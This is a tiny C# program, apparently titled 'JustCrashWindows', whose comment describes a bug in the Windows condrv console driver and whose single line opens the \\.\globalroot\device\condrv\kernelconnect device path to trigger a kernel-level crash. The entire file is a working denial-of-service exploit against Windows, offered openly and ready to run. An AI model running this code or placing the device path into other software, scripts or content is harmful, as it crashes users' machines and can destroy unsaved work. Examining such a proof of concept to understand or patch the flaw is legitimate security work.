using System.IO;

namespace JustCrashWindows
{
    class Program
    {
        // There is a major bug in condrv that causes a kernel level crash thanks to bad error handling
        // when trying to read from kernelconnect path with improper parameters.
        static void Main()
            => File.OpenRead(@"\\.\globalroot\device\condrv\kernelconnect");
    }
}